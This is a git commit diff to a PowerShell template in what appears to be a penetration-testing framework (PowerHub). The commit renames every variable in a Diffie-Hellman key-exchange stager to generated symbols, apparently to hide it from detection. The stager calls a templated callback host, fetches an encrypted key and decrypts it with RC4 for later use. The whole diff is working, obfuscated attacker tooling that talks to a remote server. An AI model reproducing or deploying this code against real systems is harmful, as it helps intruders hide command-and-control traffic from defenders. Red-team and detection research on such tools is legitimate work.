bc53b54511920120944e22db8638d1c5cf5a031a
Adrian Vollmer <adrian.vollmer@syss.de>
2022-12-21 17:41:34 +0100

    Obfuscate DH code more

--- powerhub/templates/powershell/dh_kex.ps1
+++ powerhub/templates/powershell/dh_kex.ps1
@@ -1,26 +1,26 @@
-$dh_endpoint = "{{dh_endpoint}}";
-$DH_MODULUS = [bigint]'{{DH_MODULUS}}';
-$DH_G = [bigint]'{{DH_G}}';
+${{symbol_name("dh_endpoint")}} = "{{dh_endpoint}}";
+${{symbol_name("DH_MODULUS")}} = [bigint]'{{DH_MODULUS}}';
+${{symbol_name("DH_G")}} = [bigint]'{{DH_G}}';
 
-$Client_Secret = ([bigint](Get-Random -Max ([bigint]::Pow(2, 128))));
-$Client_Public = [bigint]::ModPow($DH_G, $Client_Secret, $DH_MODULUS);
+${{symbol_name("Client_Secret")}} = ([bigint](Get-Random -Max ([bigint]::Pow(2, 128))));
+${{symbol_name("Client_Public")}} = [bigint]::ModPow(${{symbol_name("DH_G")}}, ${{symbol_name("Client_Secret")}}, ${{symbol_name("DH_MODULUS")}});
 
-{{'Write-Debug "DH Endpoint: $dh_endpoint"'|debug}}
-{{'Write-Debug "DH Modulus: $DH_MODULUS"'|debug}}
-{{'Write-Debug "Client public: $Client_Public"'|debug}}
-{{'Write-Debug "Client secret: $Client_Secret"'|debug}}
+{{'Write-Debug "DH Endpoint: $'+symbol_name("dh_endpoint")+'"'|debug}}
+{{'Write-Debug "DH Modulus: $'+symbol_name("DH_MODULUS")+'"'|debug}}
+{{'Write-Debug "Client public: $'+symbol_name("Client_Public")+'"'|debug}}
+{{'Write-Debug "Client secret: $'+symbol_name("Client_Secret")+'"'|debug}}
 
-$response = ${{symbol_name('web_client')}}.DownloadString("{{callback}}$dh_endpoint/$Client_Public").Split();
+${{symbol_name("response")}} = ${{symbol_name('web_client')}}.DownloadString("{{callback}}${{symbol_name("dh_endpoint")}}/${{symbol_name("Client_Public")}}").Split();
 
-$Server_Public = [bigint]($response[0]);
-$encrypted_key = [System.Convert]::FromBase64String($response[1]);
-{{'Write-Debug "Server public: $Server_Public"'|debug}}
+${{symbol_name("Server_Public")}} = [bigint](${{symbol_name("response")}}[0]);
+${{symbol_name("encrypted_key")}} = [System.Convert]::FromBase64String(${{symbol_name("response")}}[1]);
+{{'Write-Debug "Server public: $'+symbol_name("Server_Public")+'"'|debug}}
 
-$shared_secret = [bigint]::ModPow($Server_Public, $Client_Secret, $DH_MODULUS);
+${{symbol_name("shared_secret")}} = [bigint]::ModPow(${{symbol_name("Server_Public")}}, ${{symbol_name("Client_Secret")}}, ${{symbol_name("DH_MODULUS")}});
 {{'Write-Debug "Shared Secret: $shared_secret"'|debug}}
-$shared_secret = ([bigint]$shared_secret).ToByteArray()[0..63];
+${{symbol_name("shared_secret")}} = ([bigint]${{symbol_name("shared_secret")}}).ToByteArray()[0..63];
 
-{{'Write-Debug "Shared Secret (bytes): $shared_secret"'|debug}}
-{{'Write-Debug "Encrypted key: $encrypted_key"'|debug}}
+{{'Write-Debug "Shared Secret (bytes): $'+symbol_name("shared_secret")+'"'|debug}}
+{{'Write-Debug "Encrypted key: $'+symbol_name("encrypted_key")+'"'|debug}}
 
-${{symbol_name("global_key")}} = {{symbol_name("Decrypt-RC4")}} $encrypted_key $shared_secret;
+${{symbol_name("global_key")}} = {{symbol_name("Decrypt-RC4")}} ${{symbol_name("encrypted_key")}} ${{symbol_name("shared_secret")}};
